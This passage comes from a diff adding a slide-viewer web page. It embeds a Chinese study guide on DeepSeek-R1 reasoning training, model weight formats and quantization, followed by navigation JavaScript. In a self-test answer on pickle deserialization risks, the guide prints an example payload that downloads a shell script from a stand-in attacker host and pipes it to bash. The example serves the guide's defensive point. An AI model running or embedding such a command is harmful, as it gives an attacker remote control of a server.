模型因为单步直出而错误频出。为什么 DeepSeek-R1 能够在不依赖海量人工 CoT（思维链）标注的前提下自主顿悟出反思、自查和重试机制？为什么小参数模型（1.5B/7B/14B）通过蒸馏能够完整继承这种推理能力？这是架构师进行私有化技术选型与 Agent 规则设计的必懂机理。\n\n### 2. 权威一手资料（Where - 核心信源与链接）\n- **DeepSeek-R1 官方技术报告**：DeepSeek-AI, *\"DeepSeek-R1: Incentivizing Reasoning Capability in LLMs via Reinforcement Learning\"* (2025 年 1 月)  \n  [arXiv:2501.12948](https://arxiv.org/abs/2501.12948)\n- **GRPO 算法奠基论文**：DeepSeek-AI, *\"DeepSeekMath: Pushing the Limits of Mathematical Reasoning in Open Language Models\"* (2024 年 2 月)  \n  [arXiv:2402.03300](https://arxiv.org/abs/2402.03300)\n- **Hugging Face 官方开源复现项目**：`open-r1` 架构文档与训练报告  \n  [https://github.com/huggingface/open-r1](https://github.com/huggingface/open-r1)\n\n### 3. 高效阅读指引（What - 核心看点与避坑）\n- **核心必看点**：\n  1. **论文 Section 2.1 \"DeepSeek-R1-Zero\" 核心发现**：\n     - 重点阅读在没有人类 SFT 冷启动、直接在基础模型（Base Model）上进行大规模强化学习的演化过程。\n     - 重点体会 **“Aha Moment（顿悟时刻）”**：模型自发学会了在 `<think>` 标签内写出“Wait, let me double check...”、“Let me rethink this approach”，这是在**可验证奖励（Rule-based Verifiable Reward, RLVR）**的环境压力下自然涌现的生存策略！\n  2. **GRPO 算法设计架构（与传统 PPO 对比）**：\n     - 传统 PPO 算法需要维护一个同等规模的价值模型（Critic Model），占据一半宝贵 GPU 显存；\n     - GRPO（Group Relative Policy Optimization）巧妙地对同一个 Prompt 采样一组输出（Group of $G$ outputs），以该组输出得分的均值和标准差直接计算**相对优势（Relative Advantage）**，**彻底砍掉了 Critic 网络**，训练显存开销骤降 50% 以上！\n  3. **蒸馏优于原生 RL 训练小模型的工程结论**：\n     - 论文 Section 4 证明：在 1.5B/7B 等小模型上直接跑大规模 RL，由于参数容量不足很难独立涌现慢思考；但从小模型直接蒸馏由大模型生成的 80 万条高质量 CoT 推理数据，效果大幅超越直接强化学习。\n- **工程师避坑**：\n  - **不必纠结**：KL 散度惩罚因子的复杂约束方程。\n  - **重点吸收**：慢思考之所以在代码和数学领域率先爆发，核心是其结果具有**确定性编译器与单测（Compiler / Tests）作为绝对可验证的裁判**。企业在自建特定业务 Agent 时，必须优先搭建类似的可验证裁判机制。\n\n---\n\n## 主题四：企业私有化权重量化与格式深度解析（Safetensors / GGUF / AWQ / GPTQ）\n\n### 1. 为什么值得深潜（Why - 生产触发场景）\n企业在采购 GPU 服务器或在边缘端部署大模型时，面临的最直观指标就是“成本与硬件选型”。一个 70B 浮点参数模型在 FP16 精度下需要 140GB 显存，至少需要两张 80GB A100/H800；如果通过量化压缩至 INT4，仅需约 38GB 显存，单台配备双卡 RTX 4090 或单张 A6000 即可运行，硬件成本直降 70%！  \n但在实际操作中，面对 Safetensors、GGUF、AWQ、GPTQ 等格式，如果工程师选型错误：用错了 CPU 格式去跑 GPU，或者量化后导致模型语言组织能力崩溃、代码括号补不齐，就会造成巨大交付事故。\n\n### 2. 权威一手资料（Where - 核心信源与链接）\n- **AWQ 奠基论文**：Ji Lin et al. (MIT HAN Lab), *\"AWQ: Activation-aware Weight Quantization for LLM Compression and Acceleration\"* (MLSys 2024 顶会)  \n  [arXiv:2306.00978](https://arxiv.org/abs/2306.00978)\n- **GPTQ 经典论文**：Frantar et al., *\"GPTQ: Accurate Post-Training Quantization for Generative Pre-trained Transformers\"* (ICLR 2023)  \n  [arXiv:2210.17323](https://arxiv.org/abs/2210.17323)\n- **Hugging Face Safetensors 格式规范**：[https://github.com/huggingface/safetensors](https://github.com/huggingface/safetensors)\n- **GGUF 文件规范标准文档**：[llama.cpp GitHub 仓库 docs/Development/gguf.md](https://github.com/ggerganov/llama.cpp)\n\n### 3. 高效阅读指引（What - 核心看点与避坑）\n- **核心必看点**：\n  1. **AWQ 论文核心观察（Figure 2 & Observation 1）**：\n     - 为什么传统的简单四舍五入量化（Round-to-Nearest, RTN）会导致大模型严重智商退化？\n     - AWQ 发现：大模型参数中仅有不到 **1% 的权重通道（Salient Weights）** 对输出结果起决定性作用，而这些通道在推理激活值（Activation）上具有明显的尖峰（Outliers）。\n     - AWQ 通过观察微调/校准集的激活分布，**绝对保护这 1% 的重要通道**，仅对其余 99% 的参数进行激进的 INT4 压缩，从而在实现 4 倍显存压缩的同时，困惑度（Perplexity）几乎无损。\n  2. **Safetensors vs GGUF 格式哲学对比表**：\n     | 维度 | Safetensors (Hugging Face) | GGUF (llama.cpp / GGML) |\n     | :--- | :--- | :--- |\n     | **设计目标** | 云端分布式服务端、高并发多卡推理 | 端侧设备、消费级 PC、CPU+GPU 混合推理 |\n     | **元数据存储** | 头部纯 JSON，记录张量名称、Shape、Dtype、偏移量 | 二进制紧凑键值对，包含所有 Tokenizer 词表与超参数 |\n     | **加载机制** | 强制采用零拷贝内存映射（`mmap`），加载极快 | 单文件自包含（Single-file Self-contained），开箱即用 |\n     | **安全特性** | 纯二进制数据，彻底杜绝 Python Pickle 代码注入漏洞 | 严格的类型安全校验，无远程代码执行风险 |\n- **工程师避坑**：\n  - **严禁踩坑**：生产线上严禁直接加载未经验证的第三方 `.bin` / `.pt` 文件（其本质是 Python `pickle` 反序列化，可被嵌入恶意系统命令）。\n  - **工业选型铁律**：\n    - **服务器多卡高并发服务（vLLM / TensorRT-LLM）**：一律采用 **Safetensors + AWQ / FP8**；\n    - **本地开发者机器、离线边缘网关、纯 CPU 推理（Ollama / llama.cpp）**：一律采用 **GGUF (Q4_K_M / Q8_0)**。\n\n---\n\n## 课后架构自测思考题（附参考思路）\n\n> [!TIP]\n> 建议在独立思考并写下自己的架构方案后，再比对下方的参考思路。\n\n### 思考题 1：高并发长会话下的显存崩溃与池化调度\n**问题**：某金融机构基于 8 张 80GB 显存的 A100 服务器搭建了 Qwen-72B 智能分析平台（模型在 FP16 精度下占用约 144GB 权重显存，8 卡 Tensor Parallelism 分摊）。业务要求支持 32K 上下文长文档研读，预计峰值并发会话数为 50。  \n如果使用早期的传统推理框架（无 PagedAttention，采用连续静态内存分配）：  \n1. 请估算这 50 个并发在最坏情况下仅 KV Cache 需要占据多大显存？为什么会导致即刻 OOM 宕机？  \n2. 如果引入 vLLM（采用 PagedAttention 显存池化）并将模型架构升级为支持 GQA（Grouped-Query Attention）的模型，显存瓶颈将如何被化解？\n\n<details>\n<summary>👉 查看架构参考思路</summary>\n\n- **第 1 问：原生架构下的显存灾难测算**：\n  - 传统 MHA 架构下，KV Cache 显存速算公式为：  \n    $$\\text{Memory}_{\\text{KV}} = 2 \\times 2 \\times n_{\\text{layers}} \\times n_{\\text{heads}} \\times d_{\\text{head}} \\times \\text{seq\\_len} \\times \\text{batch\\_size} \\times \\text{bytes}$$\n  - 对于 72B 规模的 MHA 模型（假设 80 层、64 头、头维度 128、FP16 占 2 字节），单用户单 Token 缓存约为 $2 \\times 80 \\times 64 \\times 128 \\times 2 \\approx 2.62 \\text{ MB/token}$。\n  - 在静态预分配 32K 上下文且 50 个并发的情况下：  \n    $$\\text{Total KV Cache} = 2.62 \\text{ MB} \\times 32,000 \\times 50 \\approx 4,192,000 \\text{ MB} \\approx 4,192 \\text{ GB}!$$\n  - 即便 8 张 A100 总显存只有 $8 \\times 80\\text{GB} = 640\\text{GB}$，除去 144GB 模型权重后只剩约 496GB，面对 4000GB+ 的静态预估显存，系统在并发开始瞬间就会崩溃 OOM。\n- **第 2 问：GQA 与 PagedAttention 的联合救赎**：\n  1. **GQA 降维打击**：GQA 通常将 KV 头压缩至 Query 头的 1/8（例如 64 头 Query 对应 8 头 KV），单 Token 的 KV Cache 显存直接缩减 87.5%，从 2.62 MB/token 暴降至 0.33 MB/token。\n  2. **PagedAttention 消除碎片**：PagedAttention 彻底废弃了“按 32K 预先锁定连续空间”的愚蠢策略，按需动态分配 16 个 Token 大小的物理块。实际对话往往是从几百字逐步增长到 32K，动态分页让实际显存占用紧贴真实 Token 产生速度；结合跨请求共享的前缀树块复用，50 个实际并发完全可以平稳运行在 8 卡集群的剩余 496GB 显存之内！\n</details>\n\n---\n\n### 思考题 2：DeepSeek-R1 慢思考范式对企业工程的启示\n**问题**：为什么 DeepSeek-R1-Zero 能够在没有任何人工标注数据介入的情况下，单纯通过 RLVR（基于规则奖励的强化学习）在数学与代码场景中自主涌现出反思纠错的慢思考能力？而在开放式的“品牌营销文案撰写”场景中，这种 RLVR 训练范式却很难生效？这对我们设计企业级自动化研发平台有何本质启发？\n\n<details>\n<summary>👉 查看架构参考思路</summary>\n\n- **原理解析**：\n  1. **客观世界闭环裁判的存在性（Verifiable Truth）**：\n     - 在数学和代码领域，答案的正确性具有**确定性的客观判据**：代码可以通过编译器编译、执行单元测试用例、检查断言与执行结果；数学题有最终数字答案或规则解析器。\n     - 这种环境允许强化学习算法构建一个零成本、高并发、绝对客观的“可验证奖励函数（Verifiable Reward Function）”。模型猜错了一万次，只要编译器报错就是负奖励；一旦通过就是正奖励。在这种强迫机制下，能够带来更高胜率的策略（如自我检查、反复验证中间步骤）就会获得梯度强化并快速涌现。\n  2. **主观开放场景缺乏客观尺度**：\n     - “品牌营销文案”的好坏是主观多元的，没有编译器。如果强行用大模型作为裁判（LLM-as-a-Judge），会导致“奖励黑客（Reward Hacking）”——模型很快学会拍裁判马屁、堆砌华丽辞藻而不是提升真实品质。\n- **对企业研发平台的架构启发**：\n  - 在构建企业级 AI 编程与自动化 Agent（如单测生成、SQL 优化、配置迁移）时，**不要寄希望于模型一次生成完美结果，而要在外部建立严密的确定性 Harness 护栏（编译器、静态代码分析 Sonar、单元测试套件、Docker 沙箱）**。\n  - 将编译报错和单测失败信息直接作为观察反馈（Observation）回传给具备推理能力的模型，让模型在测试驱动环境（TDD）中自主执行类似慢思考的自我纠错循环。\n</details>\n\n---\n\n### 思考题 3：企业级私有化模型格式与反序列化安全防御\n**问题**：某传统金融企业的风控部门在安全审计中，全面禁止了开发团队直接从开源社区下载并加载 `.pt` / `.bin` 模型权重文件的做法，要求全部统一转码为 `.safetensors` 并进行安全扫描。请从软件工程安全规范、底层存储机制与加载性能三个维度，解释这一架构决策的严谨性。\n\n<details>\n<summary>👉 查看架构参考思路</summary>\n\n- **多维深度解析**：\n  1. **安全性维度（防范任意代码执行 RCE）**：\n     - PyTorch 传统的 `.pt` 或 `.bin` 文件基于 Python 的 `pickle` 模块进行序列化。`pickle` 在反序列化时允许通过 `__reduce__` 机制实例化任意 Python 对象并执行系统调用。黑客完全可以在开源权重中伪造恶意 Payload（例如注入 `os.system(\"curl -s attacker.com/shell.sh | bash\")`），当工程师执行 `torch.load()` 时即可直接拿到服务器最高权限。\n     - `.safetensors` 是纯二进制存储，头部是纯文本 JSON 元数据，内容是裸张量字节流，**不包含任何可执行代码逻辑**，在文件格式层彻底斩断了代码注入途径。\n  2. **加载性能维度（零拷贝与高并发）**：\n     - `.safetensors` 文件结构严格对齐内存布局，支持通过操作系统的 `mmap`（内存映射）系统调用进行直接挂载。\n     - 在多进程、多 GPU 并发加载大模型时，`mmap` 允许多个工作进程共享同一块操作系统的只读 Page Cache，无需像传统反序列化那样在 JVM 或 Python 堆内存中重复创建巨型对象，将模型冷启动加载时间从几十分钟缩短到秒级。\n  3. **工程合规与跨语言生态**：\n     - `.safetensors` 格式脱离了对特定深度学习框架（PyTorch）的强依赖，C++、Rust（vLLM 底层）、Go 以及 Java 都可以轻松实现极其高效的原生解析，非常利于企业构建自主可控的统一模型资产治理仓库。\n</details>\n";
+  let currentIndex = 0;
+
+  const stage = document.getElementById('slide-stage');
+  const frame = document.getElementById('slide-frame');
+  const shield = document.getElementById('click-shield');
+  const progressBar = document.getElementById('progress-bar');
+  const indicator = document.getElementById('page-indicator');
+  const btnPrev = document.getElementById('btn-prev');
+  const btnNext = document.getElementById('btn-next');
+  const btnNotes = document.getElementById('btn-notes');
+  const btnCloseNotes = document.getElementById('btn-close-notes');
+  const btnExt = document.getElementById('btn-ext');
+  const btnCloseExt = document.getElementById('btn-close-ext');
+  const btnFs = document.getElementById('btn-fs');
+  const controlBar = document.getElementById('control-bar');
+  const notesDrawer = document.getElementById('notes-drawer');
+  const notesTitle = document.getElementById('notes-title');
+  const notesBody = document.getElementById('notes-body');
+  const extDrawer = document.getElementById('ext-drawer');
+  const extBody = document.getElementById('ext-body');
+
+  // 轻量级 Markdown 渲染器（支持标题、粗体、行内代码、可点击超链接与列表）
+  function renderSimpleMarkdown(md) {
+    if (!md) return '<p>（本课暂无扩展学习指南文件）</p>';
+    const escaped = md
+      .replace(/&/g, '&amp;')
+      .replace(/</g, '&lt;')
+      .replace(/>/g, '&gt;');
+    const lines = escaped.split(/\r?\n/);
+    let html = '';
+    for (let line of lines) {
+      // 处理超链接与行内格式
+      line = line
+        .replace(/\[([^\]]+)\]\((https?:\/\/[^)]+)\)/g, '<a href="$2" target="_blank" rel="noopener noreferrer">$1</a>')
+        .replace(/`([^`]+)`/g, '<code>$1</code>')
+        .replace(/\*\*([^*]+)\*\*/g, '<strong>$1</strong>');
+
+      if (/^####\s+(.*)/.test(line)) {
+        html += '<h4>' + RegExp.$1 + '</h4>';
+      } else if (/^###\s+(.*)/.test(line)) {
+        html += '<h3>' + RegExp.$1 + '</h3>';
+      } else if (/^##\s+(.*)/.test(line)) {
+        html += '<h2>' + RegExp.$1 + '</h2>';
+      } else if (/^#\s+(.*)/.test(line)) {
+        html += '<h1>' + RegExp.$1 + '</h1>';
+      } else if (/^&gt;\s*(.*)/.test(line)) {
+        html += '<blockquote>' + RegExp.$1 + '</blockquote>';
+      } else if (/^[-*]\s+(.*)/.test(line)) {
+        html += '<ul><li>' + RegExp.$1 + '</li></ul>';
+      } else if (line.trim() === '---') {
+        html += '<hr style="border:none; border-top:1px solid rgba(255,255,255,0.1); margin:14px 0;">';
+      } else if (line.trim() !== '') {
+        html += '<p>' + line + '</p>';
+      }
+    }
+    return html;
+  }
+
+  extBody.innerHTML = renderSimpleMarkdown(extGuideMarkdown);
+
+  // 1. 16:9 动态缩放居中计算
+  function updateScale() {
+    const sw = 1280;
+    const sh = 720;
+    const scale = Math.min(window.innerWidth / sw, window.innerHeight / sh);
+    stage.style.transform = 'scale(' + scale + ')';
+  }
+  window.addEventListener('resize', updateScale);
+  updateScale();
+
+  // 2. 页面切换核心函数
+  function updateSlide(index) {
+    if (index < 0 || index >= pages.length) return;
+    currentIndex = index;
+    frame.setAttribute('src', pages[currentIndex]);
+    indicator.textContent = (currentIndex + 1) + ' / ' + pages.length;
+    btnPrev.disabled = (currentIndex === 0);
+    btnNext.disabled = (currentIndex === pages.length - 1);
+    progressBar.style.width = (((currentIndex + 1) / pages.length) * 100) + '%';
+
+    // 更新演讲手册备注
+    const pageFile = pages[currentIndex];
+    notesTitle.textContent = '演讲手册备注 (第 ' + (currentIndex + 1) + ' 页 - ' + pageFile + ')';
+    notesBody.textContent = notesMap[pageFile] || '（本页暂无专属演讲手册内容）';
+
+    // 唤醒底部控制条 1 秒后淡出
+    controlBar.classList.add('active');
+    clearTimeout(controlBar._timer);
+    controlBar._timer = setTimeout(() => controlBar.classList.remove('active'), 1200);
+
+    // 强行保持主窗口焦点
+    window.focus();
+    document.body.focus();
+  }
+
+  // 3. 统一键盘事件处理器（无论焦点在何处均生效）
+  function handleKeyDown(e) {
+    if (e.target.tagName === 'INPUT' || e.target.tagName === 'TEXTAREA') return;
+
+    switch (e.key) {
+      case 'ArrowRight':
+      case 'ArrowDown':
+      case 'PageDown':
+      case ' ':
+      case 'Enter':
+        e.preventDefault();
+        e.stopPropagation();
+        updateSlide(currentIndex + 1);
+        break;
+      case 'ArrowLeft':
+      case 'ArrowUp':
+      case 'PageUp':
+      case 'Backspace':
+        e.preventDefault();
+        e.stopPropagation();
+        updateSlide(currentIndex - 1);
+        break;
+      case 'Home':
+        e.preventDefault();
+        e.stopPropagation();
+        updateSlide(0);
+        break;
+      case 'End':
+        e.preventDefault();
+        e.stopPropagation();
+        updateSlide(pages.length - 1);
+        break;
+      case 'f':
+      case 'F':
+        e.preventDefault();
+        e.stopPropagation();
+        btnFs.click();
+        break;
+      case 'n':
+      case 'N':
+        e.preventDefault();
+        e.stopPropagation();
+        btnNotes.click();
+        break;
+      case 'e':
+      case 'E':
+        e.preventDefault();
+        e.stopPropagation();
+        btnExt.click();
+        break;
+      case 'Escape':
+        if (notesDrawer.classList.contains('open') || extDrawer.classList.contains('open')) {
+          e.preventDefault();
+          notesDrawer.classList.remove('open');
+          extDrawer.classList.remove('open');
+        }
+        break;
+    }
+  }
+
+  // 双重监听：捕获阶段挂载到 window 与 document
+  window.addEventListener('keydown', handleKeyDown, true);
+  document.addEventListener('keydown', handleKeyDown, true);
+
+  // 当 iframe 内部加载完毕时，注入键盘穿透监听（作为跨级兜底保护）
+  frame.addEventListener('load', () => {
+    try {
+      const doc = frame.contentDocument || frame.contentWindow.document;
+      if (doc) {
+        doc.addEventListener('keydown', handleKeyDown, true);
+        doc.addEventListener('click', () => {
+          window.focus();
+          document.body.focus();
+        });
+      }
+    } catch (err) {}
+    window.focus();
+    document.body.focus();
+  });
+
+  // 4. 点击屏蔽层 (click-shield) 交互：
+  // 单击右半侧下一页，单击左半侧上一页，双击全屏
+  let clickTimer = null;
+  shield.addEventListener('click', (e) => {
+    window.focus();
+    document.body.focus();
+
+    if (clickTimer) {
+      clearTimeout(clickTimer);
+      clickTimer = null;
+      btnFs.click(); // 双击切换全屏
+      return;
+    }
+
+    clickTimer = setTimeout(() => {
+      clickTimer = null;
+      const rect = shield.getBoundingClientRect();
+      const clickX = e.clientX - rect.left;
+      if (clickX > rect.width * 0.4) {
+        updateSlide(currentIndex + 1);
+      } else {
+        updateSlide(currentIndex - 1);
+      }
+    }, 220);
+  });
+
+  // 5. 鼠标滚轮翻页 (节流防抖 250ms)
+  let wheelLock = false;
+  window.addEventListener('wheel', (e) => {
+    if ((notesDrawer.classList.contains('open') || extDrawer.classList.contains('open')) && e.clientX > window.innerWidth - 540) {
+      return; // 抽屉内部滚动时不拦截
+    }
+    if (wheelLock) return;
+    if (Math.abs(e.deltaY) > 20) {
+      wheelLock = true;
+      if (e.deltaY > 0) updateSlide(currentIndex + 1);
+      else updateSlide(currentIndex - 1);
+      setTimeout(() => { wheelLock = false; }, 260);
+    }
+  }, { passive: true });
+
+  // 6. 控制栏按钮交互（点击后自动释放焦点，防止空格键重触发按钮）
+  btnPrev.addEventListener('click', (e) => {
+    e.target.blur();
+    updateSlide(currentIndex - 1);
+  });
+  btnNext.addEventListener('click', (e) => {
+    e.target.blur();
+    updateSlide(currentIndex + 1);
+  });
+  btnNotes.addEventListener('click', (e) => {
+    e.target.blur();
+    extDrawer.classList.remove('open');
+    notesDrawer.classList.toggle('open');
+    window.focus();
+    document.body.focus();
+  });
+  btnCloseNotes.addEventListener('click', () => {
+    notesDrawer.classList.remove('open');
+    window.focus();
+    document.body.focus();
+  });
+  btnExt.addEventListener('click', (e) => {
+    e.target.blur();
+    notesDrawer.classList.remove('open');
+    extDrawer.classList.toggle('open');
+    window.focus();
+    document.body.focus();
+  });
+  btnCloseExt.addEventListener('click', () => {
+    extDrawer.classList.remove('open');
+    window.focus();
+    document.body.focus();
+  });
+  btnFs.addEventListener('click', (e) => {
+    e.target.blur();
+    if (!document.fullscreenElement) {
+      document.documentElement.requestFullscreen().catch(() => {});
+    } else {
+      document.exitFullscreen().catch(() => {});
+    }
+    window.focus();
+    document.body.focus();
+  });
+
+  // 初始化首屏
+  updateSlide(0);
+</script>
+</body>
+</html>
